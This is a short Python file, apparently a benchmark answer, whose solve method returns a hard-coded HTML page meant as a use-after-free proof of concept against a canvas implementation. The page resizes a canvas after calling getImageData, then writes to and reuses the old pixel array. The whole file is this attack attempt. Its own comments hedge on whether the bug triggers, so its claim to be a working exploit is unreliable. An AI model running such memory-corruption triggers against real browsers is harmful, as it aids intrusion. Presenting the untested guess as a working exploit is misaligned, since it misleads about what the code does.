class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = b"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>UAF PoC</title>
</head>
<body>
    <canvas id="c" width="2048" height="2048" style="display:none;"></canvas>
    <script>
        var canvas = document.getElementById('c');
        var ctx = canvas.getContext('2d');
        // Fill canvas with some data to allocate backing store
        ctx.fillStyle = 'red';
        ctx.fillRect(0, 0, 2048, 2048);
        // Get ImageData, which should reference or copy the backing store
        var imgData = ctx.getImageData(0, 0, 2048, 2048);
        var data = imgData.data;  // This is the Uint8ClampedArray
        // Resize canvas to trigger reallocation and potential free of old backing store
        canvas.width = 1;
        canvas.height = 1;
        // Now access the data, which may point to freed memory due to improper implementation
        for (var i = 0; i < 10000; i++) {
            data[i * 4] = 255;     // Write to potentially freed memory
            data[i * 4 + 1] = 0;   // Green
            data[i * 4 + 2] = 0;   // Blue
            data[i * 4 + 3] = 255; // Alpha
        }
        // Attempt to use it, triggering UAF
        ctx.putImageData(imgData, 0, 0);
        console.log('PoC executed');
    </script>
</body>
</html>"""
        return poc